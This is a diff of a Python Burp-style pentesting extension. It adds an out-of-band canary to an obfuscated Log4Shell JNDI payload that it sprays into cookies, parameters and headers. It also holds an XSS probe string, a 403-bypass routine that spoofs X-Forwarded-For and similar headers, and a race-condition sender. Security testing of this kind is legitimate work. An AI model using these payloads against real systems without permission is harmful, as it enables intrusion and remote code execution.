@@ -3,7 +3,7 @@ import json
 import ssl
 import urllib2
 
-
+canary = getOOBCanary()
 pool = RequestPool(20)
 
 """
@@ -11,7 +11,7 @@ pool = RequestPool(20)
 """
 
 def insert_at_cursor():
-    return "'\"><img/src/onerror=alert(1)>${jndi:ldap://example.com/a}"
+    return "'\"><img/src/onerror=alert(1)>${jndi:ldap://inseratcursor." + canary + "/a}"
 
 
 def unicode_escape(selectedText):
@@ -24,13 +24,15 @@ def json_dumps(selectedText):
 
 
 def json_quotes(selectedText):
-    return json.dumps(json.dumps(json.loads(selectedText)))
+    return json.dumps(selectedText, ensure_ascii=True)
 
 
 def bypass403(messageEditor):
-    ip = "127.0.0.1"
     request = messageEditor.requestResponse().request()
-    messageEditor.setRequest(request.withHeader("X-Forwarded-For", ip).withHeader("X-Originating-IP", ip).withHeader("X-Remote-IP", ip).withHeader("X-Remote-Addr", ip).withHeader("X-Real-IP", ip).withHeader("X-Forwarded-Host", ip).withHeader("X-Client-IP", ip).withHeader("X-Host", ip))
+    xheaders = ["X-Forwarded-For", "X-Originating-IP", "X-Remote-Addr", "X-Remote-IP", "X-Remote-Addr", "X-Real-IP", "X-Forwarded-Host", "X-Client-IP", "X-Host"]
+    for header in xheaders:
+        request = request.withHeader(header, "127.0.0.1")
+    messageEditor.setRequest(request)
 
 
 # When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
@@ -42,11 +44,14 @@ def race_condition_10(request):
     sendRequests([request] * 10)
 
 
+def handleInteraction(interaction):
+    print(interaction.dnsDetails().get().query().toString())
+
+
 def log4shell(request):
-    collaborator = 'TOKEN.oastify.com'
     print("log4shell requests: ", request.url())
     host = request.httpService().host()
-    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//" + host + "." + collaborator + "/log4shell}"  # Replace it
+    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//" + host + "." + canary + "/log4shell}"  # Replace it
     pool.run(sendRequest, modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
     pool.run(sendRequest, modifyAllParamsValue(request, payload))
     for header in request.headers():
